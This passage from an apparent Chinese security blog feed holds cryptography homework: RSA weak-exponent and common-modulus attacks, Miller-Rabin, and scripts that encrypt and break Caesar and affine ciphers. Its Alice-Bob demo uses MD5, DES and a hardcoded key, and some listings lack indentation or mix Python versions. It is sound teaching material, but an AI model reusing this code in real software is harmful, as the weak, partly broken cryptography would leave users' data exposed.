m=sqrt[3]{c}$</p></blockquote><p>  如果明文的三次方比n大，但是不是足够大，那么设k，有：</p><p>  ​                        $ c= m^e+kn$</p><p>  爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。</p><ul><li><p>低加密指数广播攻击。如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 </p><p>即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：</p><p>​                        $ c_1equiv m^e$ $mod$ $n_1$</p><p>​                        $ c_2equiv m^e$ $mod$ $n_2$</p><p>​                        $ c_3equiv m^e$ $mod$ $n_3$</p><p>对上述等式运用中国剩余定理，在e=3时，可以得到：</p><p>​                        $ c_xequiv m^3$ $mod$ $n_1n_2n_3$</p><p>通过对$ c_x $进行三次开方可以求得明文。</p></li><li><p>公模攻击。如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。</p><p>即：</p><p>​                        $ c_1equiv m^{e_1}$ $mod$ $n$</p><p>​                        $ c_2equiv m^{e_2}$ $mod$ $n$</p><p>此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。</p></li></ul><hr><p>​    由于RSA良好的安全性，RSA可用来电子签名中来确认通信双方身份。</p><hr><p>通过对RSA的分析可知，RSA的安全性是基于大数的难分解性的，所以应尽可能选择足够大的p、q，目前大素数的产生依然是一个世界难题，这里展示一个素性判断算法miller-rabin算法，可以利用此算法判断一个数是不是素数从而穷举产生大素数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xn_mod_p2</span><span class="params">(x, n, p)</span>:</span></span><br><span class="line">  res = <span class="number">1</span></span><br><span class="line">  <span class="comment"># n_bin = bin(n)[2:]</span></span><br><span class="line">  n_bin = bin(int(n))[<span class="number">2</span>:]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(n_bin)):</span><br><span class="line">    res = res**<span class="number">2</span> % p</span><br><span class="line">    <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">      res = res * x % p</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin_witness</span><span class="params">(a, p)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> p == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">  <span class="keyword">if</span> p == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">  <span class="comment">#p-1 = u*2^t 求解 u, t</span></span><br><span class="line">  n = p - <span class="number">1</span></span><br><span class="line">  t = int(math.floor(math.log(n, <span class="number">2</span>)))</span><br><span class="line">  u = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> t &gt; <span class="number">0</span>:</span><br><span class="line">    u = n / <span class="number">2</span>**t</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span>**t == <span class="number">0</span> <span class="keyword">and</span> u % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    t = t - <span class="number">1</span></span><br><span class="line">  b1 = b2 = xn_mod_p2(a, u, p)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, t + <span class="number">1</span>):</span><br><span class="line">    b2 = b1**<span class="number">2</span> % p</span><br><span class="line">    <span class="keyword">if</span> b2 == <span class="number">1</span> <span class="keyword">and</span> b1 != <span class="number">1</span> <span class="keyword">and</span> b1 != (p - <span class="number">1</span>):</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    b1 = b2</span><br><span class="line">  <span class="keyword">if</span> b1 != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_test_miller_rabin</span><span class="params">(p, k)</span>:</span></span><br><span class="line">  <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">    a = randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> miller_rabin_witness(a, p):</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    k = k - <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">num = input(<span class="string">u"请输入要进行Miller-Rabin算法检测的数："</span>)</span><br><span class="line"><span class="keyword">if</span> prime_test_miller_rabin(int(num),<span class="number">10</span>):</span><br><span class="line"><span class="keyword">print</span> (<span class="string">u"&#123;0&#125;大概率是素数"</span>.format(num))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="string">u"&#123;0&#125;是合数 "</span>.format(num))</span><br></pre></td></tr></table></figure><p><strong>实例演示：</strong></p><p><img src="/2019/01/15/crypto2/3.png" alt="demo"></p><h1 id="通信过程模拟"><a href="#通信过程模拟" class="headerlink" title="通信过程模拟"></a>通信过程模拟</h1><p>​    有了前面的算法基础，我们现在可以模拟出一个从Alice到Bob的通信过程，步骤如下:</p><p><img src="/2019/01/15/crypto2/4.png" alt="demo"></p><p>​    接下来用代码详细模拟了一下该过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> des</span><br><span class="line"></span><br><span class="line">print(<span class="string">"现在开始模拟Alice到Bob之间的通信过程："</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'*******Alice的发送准备*********'</span>)</span><br><span class="line">print()</span><br><span class="line">message = <span class="string">"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定message哈希值</span></span><br><span class="line">message_hash = md5.encrypt(message)</span><br><span class="line">sign = rsa.rsa_encrypt(message_hash)</span><br><span class="line">key = <span class="string">"infosecu"</span></span><br><span class="line">print(<span class="string">"Alice想要发送到明文信息: "</span>,message)</span><br><span class="line">print(<span class="string">"Alice的DES秘钥："</span>, key)</span><br><span class="line">print(<span class="string">"消息哈希(用于检验消息完整性): "</span>,message_hash)</span><br><span class="line">print(<span class="string">"Alice签名: "</span>, sign)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'公开信道上传输DES加密数据'</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'*******sending...**********'</span>)</span><br><span class="line">print()</span><br><span class="line">send_mess = des.encrypt(message,key)</span><br><span class="line">send_sign = des.encrypt(sign,key)</span><br><span class="line">print(<span class="string">"message: "</span>,send_mess)</span><br><span class="line">print(<span class="string">"sign: "</span>,send_sign)</span><br><span class="line">print(<span class="string">"message_hash: "</span>,message_hash)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'********sending finish*******'</span>)</span><br><span class="line">print()</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"********Bob处理收到的信息********"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"DES解密对应的内容："</span>)</span><br><span class="line">b_sign = des.decrypt(send_sign,key)</span><br><span class="line">b_mess = des.decrypt(send_mess,key)</span><br><span class="line">print(<span class="string">"Alice发送的明文message： "</span>,b_mess)</span><br><span class="line">print(<span class="string">"消息签名sign： "</span>,b_sign)</span><br><span class="line">print()</span><br><span class="line">b_mess_hash = md5.encrypt(message)</span><br><span class="line">print(<span class="string">"此时Bob自己求出明文哈希值： "</span>, b_mess_hash)</span><br><span class="line">print(<span class="string">"之后与Alice发送的消息哈希进行校验"</span>)</span><br><span class="line">print(<span class="string">"...****...."</span>)</span><br><span class="line"></span><br><span class="line">print(b_mess_hash,<span class="string">"=="</span>,message_hash,<span class="string">"消息在传输过程中没有出错! 但是无法确定是否是Alice所发。"</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line">vert = rsa.rsa_decrypt(sign)</span><br><span class="line">print(<span class="string">"Bob对签名进行RSA解密： "</span>,vert)</span><br><span class="line">print(<span class="string">"对解密后的签名值与自己计算出的MD5值相比较来验证发送方身份.."</span>)</span><br><span class="line">print(<span class="string">"verting....."</span>)</span><br><span class="line"><span class="keyword">if</span> vert == b_mess_hash:</span><br><span class="line">print(<span class="string">"message is ok. 此时Bob可以确认从Alice处收到了完整的信息。"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"message is broken."</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"通信过程完成，Bob收到了Alice的信息！"</span>)</span><br></pre></td></tr></table></figure><p><strong>实例演示：</strong></p><p><img src="/2019/01/15/crypto2/5.png" alt="demo"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上篇&lt;/p&gt;
    
    </summary>
    
      <category term="Record" scheme="http://chaosec.top/categories/Record/"/>
    
    
      <category term="Crypto" scheme="http://chaosec.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>密码学作业记录（一）</title>
    <link href="http://chaosec.top/2019/01/15/crypto1/"/>
    <id>http://chaosec.top/2019/01/15/crypto1/</id>
    <published>2019-01-15T14:28:46.000Z</published>
    <updated>2019-01-30T11:44:17.367Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习密码学，研究了一些密码学算法，特此记录一下。</p><a id="more"></a><h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><p>古典密码体制是基于古代落后的计算条件和落后的密码学与数学知识建立的，本部分选取了<strong>凯撒密码</strong>和<strong>仿射密码</strong>。</p><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>凯撒密码本质上是一种置换密码，且为一对一的置换加密方式。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</p><p><em>代码如下</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 名密文输入范围是26个英文小写字母</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"encrypt"</span>:</span><br><span class="line">plain = raw_input(<span class="string">"Please input plaintext: "</span>)</span><br><span class="line">key = input(<span class="string">"Please input key: "</span>)</span><br><span class="line">cip = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">temp = (ord(plain[i]) - ord(<span class="string">'a'</span>) + key) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">cip += chr(temp)</span><br><span class="line">print(<span class="string">"cipher: "</span> + cip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">"decrypt"</span>:</span><br><span class="line">cipher = raw_input(<span class="string">"Please input cipher: "</span>)</span><br><span class="line">key = input(<span class="string">"Please input key: "</span>)</span><br><span class="line">pla = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">temp = (ord(cipher[i])-ord(<span class="string">"a"</span>) - key) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">pla += chr(temp)</span><br><span class="line">print(<span class="string">"plaintext: "</span> + pla)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(sys.argv[<span class="number">1</span>],<span class="string">" is not supported:("</span>)</span><br></pre></td></tr></table></figure><p><img src="/2019/01/15/crypto1/1.png" alt="demo"></p><blockquote><p>安全性分析：可以看到，凯撒密码的加解密方式简单，手工即可实现，在古代落后的计算能力之下，该中算法拥有着很高的安全性，但是放在现在由于计算能力的提高，该算法表现出脆弱性，无法抵抗穷举攻击，因为对于一串明文，可能的加密组合只有26种，以现在的计算手段，对于任何攻击方式都表现出极大的脆弱性，当遭受<strong>已知明文攻击</strong>时完全没有抵抗性，故而现代密码体制中已不再采用该密码。</p></blockquote><h2 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h2><p>仿射密码的加密算法就是一个线性变换，及对任意的明文字符x，对应的密文字符为 <code>y≡e(x)≡ax+b(mod 26)</code>，其中a,b均为26以内的正整数，并且要求<code>gcd(a,26)=1</code>，函数e(x)称为仿射加密函数，解密时用<code>x≡d(e(x))≡a&#39;(e(x)-b)(mod 26)</code>来解密。</p><p><em>代码如下：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_re</span><span class="params">(a)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">27</span>):</span><br><span class="line"><span class="keyword">if</span> i*a % <span class="number">26</span> == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="comment"># ex = ax+b</span></span><br><span class="line">mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"e"</span>:</span><br><span class="line">p = str(input(<span class="string">"Plz input plain: "</span>))</span><br><span class="line">a = int(input(<span class="string">"Plz input a: "</span>))</span><br><span class="line">b = int(input(<span class="string">"Plz input b: "</span>))</span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">t = ((ord(p[i]) - ord(<span class="string">'a'</span>)) * a + b) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">c += chr(t)</span><br><span class="line">print(<span class="string">"cipher: "</span> + c)</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">"d"</span>:</span><br><span class="line"><span class="comment"># a'(e(x)-b)</span></span><br><span class="line">c = str(input(<span class="string">"Plz input cipher: "</span>))</span><br><span class="line">a = int(input(<span class="string">"Plz input a: "</span>))</span><br><span class="line">b = int(input(<span class="string">"Plz input b: "</span>))</span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">_a = get_re(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)): </span><br><span class="line">t = (ord(c[i]) - ord(<span class="string">'a'</span>) - b)*_a % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">p += chr(t)</span><br><span class="line">print(<span class="string">"plain: "</span> + p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"Input Error:("</span>)</span><br></pre></td></tr></table></figure><blockquote><p>加密时按照加密公式给出，解密时用穷举法求出a的逆元从而解密。</p></blockquote><p><em>实例演示</em></p><p><img src="/2019/01/15/crypto1/2.png" alt="demo"></p><hr><p>　　可以看到，仿射加密和凯撒加密本质都是一种一对一的加密方式，这种加密方式没有将字母出现的统计规律隐藏起来，在英文中对于足够长的英文文本来说，字符的出现频率是相对固定的，还有字母的有些组合出现频率也是相对固定的，这样就可以通过统计分析法来破解上述加密方式加密出来的密文。</p><p><em>频率分析法破解仿射密码</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假如我们已知一串密文 fmxvedkaphferbndkrxrsrefmorudsdkdvshvufedkaprkdlyevlrhhrh，</span><br><span class="line">此时可以通过频率分析法尝试爆破出明文</span><br></pre></td></tr></table></figure><p><em>代码如下</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">dic = [<span class="string">'e'</span>,<span class="string">'t'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'h'</span>,<span class="string">'r'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'c'</span>,<span class="string">'u'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'p'</span>,<span class="string">'b'</span>,<span class="string">'v'</span>,<span class="string">'k'</span>,<span class="string">'j'</span>,<span class="string">'x'</span>,<span class="string">'q'</span>,<span class="string">'z'</span>]</span><br><span class="line">freq = [<span class="number">0</span>] * <span class="number">26</span></span><br><span class="line">cipher = input(<span class="string">"Plz input cipher: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 频率统计</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">t = ord(cipher[i])-ord(<span class="string">'a'</span>)</span><br><span class="line">freq[t] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ab</span><span class="params">(x,y)</span>:</span></span><br><span class="line">dic = [<span class="string">'e'</span>,<span class="string">'t'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'h'</span>,<span class="string">'r'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'c'</span>,<span class="string">'u'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'p'</span>,<span class="string">'b'</span>,<span class="string">'v'</span>,<span class="string">'k'</span>,<span class="string">'j'</span>,<span class="string">'x'</span>,<span class="string">'q'</span>,<span class="string">'z'</span>]</span><br><span class="line">repeat = []   <span class="comment"># 去除重复计算的项</span></span><br><span class="line"><span class="keyword">for</span> one <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> two <span class="keyword">in</span> dic:</span><br><span class="line">o = ord(one) - ord(<span class="string">'a'</span>)</span><br><span class="line">t = ord(two) - ord(<span class="string">'a'</span>)</span><br><span class="line">oo = ord(x) - ord(<span class="string">'a'</span>)</span><br><span class="line">tt = ord(y) - ord(<span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># oo = a*o+b</span></span><br><span class="line"><span class="comment"># tt = a*t+b</span></span><br><span class="line"><span class="keyword">if</span> o - t == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">a = ((oo-tt)//(o-t)) % <span class="number">26</span></span><br><span class="line">b = (oo - a * o) % <span class="number">26</span></span><br><span class="line">test =  int(gmpy2.gcd(a, <span class="number">26</span>))</span><br><span class="line"><span class="keyword">if</span> test != <span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">_a = gmpy2.invert(a, <span class="number">26</span>)</span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> (a,b) <span class="keyword">in</span> repeat:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cipher:</span><br><span class="line">ex = ord(item) - ord(<span class="string">'a'</span>)</span><br><span class="line">p = (_a * (ex - b)) % <span class="number">26</span></span><br><span class="line">plain += chr(p+ord(<span class="string">'a'</span>))</span><br><span class="line">repeat.append((a,b))</span><br><span class="line">print(plain,end=<span class="string">""</span>)</span><br><span class="line">print(<span class="string">"**"</span> + str(a) + <span class="string">"**"</span> + str(b))</span><br><span class="line">print(<span class="string">"共"</span> + str(len(repeat)) + <span class="string">"项."</span>)</span><br><span class="line"></span><br><span class="line">x = chr(freq.index(max(freq)) + ord(<span class="string">'a'</span>))</span><br><span class="line">freq[freq.index(max(freq))] = <span class="number">0</span></span><br><span class="line">y = chr(freq.index(max(freq)) + ord(<span class="string">'a'</span>))</span><br><span class="line">get_ab(x,y)</span><br></pre></td></tr></table></figure><p>代码思路是先统计密文的字母出现频率，由频率高低依次对应字母频次表，联立方程组，由于未知数只有a、b，所以只需要两个方程是即可解出，依次尝试不同的变换组合即可，直至得到有意义的明文，由于统计基数的原因，密文越长，则越可能早的得到有意义的密文。为了使结果显示更加有效，代码中过滤了冗余的待选明文项（即a、b相同的情况）。</p><p><img src="/2019/01/15/crypto1/3.png" alt="demo"></p><p>可以看到密文被成功破解</p><hr><p>　　从对古典密码分析中可以看到，一个密码体系要保证安全性，应该尽可能的隐藏语言特性，即密文均匀分布，且加密的可选字符区间应尽可能的大，否则无法抵抗穷举攻击。在现代密码体制中，这两点都有了比较好的保证。</p><h1 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h1><h2 id="DES加密算法"><a href="#DES加密算法" class="headerlink" title="DES加密算法"></a>DES加密算法</h2><p>DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。 明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。 </p><p>DES加密流程如下图</p><p><img src="/2019/01/15/crypto1/5.png" alt="demo"></p><p>解密时只需要将机密流程逆序即可。</p><p>算法大致步骤如下：</p><ol><li>初始置换</li></ol><p>​DES算法使用64位的密钥key将64位的明文输入块变为64位的密文输出块，并把输出块分为L0、R0两部分，每部分均为32位。初始置换规则可查表获得，这里不再赘述。初始置换是固定的、公开的函数，因此这个初始置换及逆初始置换都没有密码意义，主要目的是为了更好地将明文和密文分组。</p><hr><p>下一步是进行轮函数（F函数）迭代，F函数具体步骤如下</p><ol><li>扩展置换（E盒）</li></ol><p>初始置换结束后，将得到64位序列分成两组，各32位，而E盒将数据的右32位输入扩展为48位输出，改变了位的次序，重复了某些位。</p><p>该步骤的目的是：a、产生与秘钥相同长度的数据以进行异或运算，R0是32位，子秘钥是48位，所以R0要先进行扩展置换之后与子秘钥进行异或运算；b、提供更长的结果，使得在替代运算时能够进行压缩。</p><ol><li>秘钥加运算</li></ol><p>该步骤非常简单，将E扩展输出的48位与48位子秘钥进行逐位异或，输出48位数据。</p><ol><li>代换盒（S盒）</li></ol><p>此步骤的功能是进行非线性变换，S盒是DES中唯一的非线性部分，经过S盒代换压缩之后，48位的数据重新被压缩成32位。</p><p>代换压缩由8个不同的代替盒(S盒)完成。每个S-盒有6位输入，4位输出。所以48位的输入块被分成8个6位的分组，每一个分组对应一个S-盒代替操作。经过S-盒代替，形成8个4位分组结果</p><p>S盒具有良好的非线性，输入的每一个比特与全部输入比特有关，两个输入相差1比特时，输入至少相差2比特，极大的保证了安全性。</p><ol><li>置换运算（P盒）</li></ol><p>置换运算（P盒）只是进行简单位置置换，而不进行扩展和压缩。</p><p>至此<strong>F函数</strong>结束</p><hr><ol><li>逆置换</li></ol><p>将初始置换进行16次的迭代，即进行16层的加密变换，这个运算过程我们暂时称为<strong>F函数</strong>。得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。</p><p><em>代码如下：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 